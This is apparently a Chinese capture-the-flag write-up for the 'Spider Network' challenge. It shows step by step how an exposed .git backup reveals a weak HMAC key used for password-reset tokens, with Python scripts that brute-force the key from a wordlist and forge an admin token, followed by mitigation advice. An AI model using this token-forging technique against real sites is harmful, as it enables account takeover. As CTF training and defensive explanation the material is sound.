# Spider Network

## 题目简述

Spider Network 是一个带注册、登录、动态时间线和密码重置功能的 Sinatra 社交网站。首页公开的源码仓库还残留了一份包含 `.git` 的备份；检查其历史分支可以找到尚未正式发布的密码重置实现。

重置令牌按下面的方式生成：

```ruby
OpenSSL::HMAC.hexdigest("SHA256", SECRET_KEY, email)
```

HMAC-SHA256 本身没有问题，但仓库中的 TODO 明确提示 `SECRET_KEY` 是弱口令。令牌又只绑定邮箱，不包含随机 nonce、有效期或服务端一次性状态，所以得到任意自有邮箱的令牌后便可以离线穷举密钥，再为管理员邮箱自行计算合法令牌。

## 解题过程

先下载网站暴露的备份并保留其中的 `.git` 目录，查看所有分支：

```bash
git branch -a
git log --all --oneline --decorate
git show add-forgot-password:forgot_password.rb
git show add-forgot-password:TODO.md
```

在 `add-forgot-password` 分支中可以确认 HMAC 的消息只有邮箱，并从 TODO 得知密钥可由常见密码字典恢复。接着注册一个可正常收信的账号，对自己的邮箱请求密码重置，记录邮箱与邮件中的 64 位十六进制 token。因为这是一组已知消息与已知 MAC，可以完全离线测试候选密钥：

```python
import hashlib
import hmac

known_email = b"YOUR_EMAIL"
known_token = "TOKEN_FROM_EMAIL"

with open("rockyou.txt", "rb") as wordlist:
    for line in wordlist:
        key = line.rstrip(b"\r\n")
        candidate = hmac.new(key, known_email, hashlib.sha256).hexdigest()
        if hmac.compare_digest(candidate, known_token):
            print(key.decode(errors="replace"))
            break
```

比赛实例的弱密钥为：

```text
spiderpig1
```

登录普通账号后浏览时间线或用户资料，可以枚举出管理员邮箱：

```text
spidersweb.manager@gmail.com
```

用恢复出的密钥为该邮箱生成新 token：

```python
import hashlib
import hmac

key = b"spiderpig1"
admin_email = b"spidersweb.manager@gmail.com"
token = hmac.new(key, admin_email, hashlib.sha256).hexdigest()
print(token)
```

得到：

```text
c1971b6fc5eedfa40d5d96a017b9a439c05f2fe8cdc8d48481e00e0c4580db7d
```

在 `/reset-password` 提交管理员邮箱、伪造 token 和新密码。服务端只重新计算同一 HMAC 并进行字符串比较，因此重置成功，并会自动以 `admin` 身份登录。管理员页面给出 flag：

```text
shellmates{w3lc0me_2_th3_5pid3r_v3rs3}
```

## 方法总结

这不是对 HMAC 算法的密码分析，而是密钥强度和令牌生命周期设计错误。已知邮箱和 token 为离线字典攻击提供了稳定判据；密钥一旦恢复，攻击者便能为任何已知邮箱生成永久有效的重置凭据。

安全实现应使用足够长的随机密钥，并为每次重置创建高熵、短时、一次性的随机 token，只在数据库中保存其哈希，同时绑定目标账号和到期时间，成功使用后立即作废。管理员邮箱是否公开不应成为安全边界。
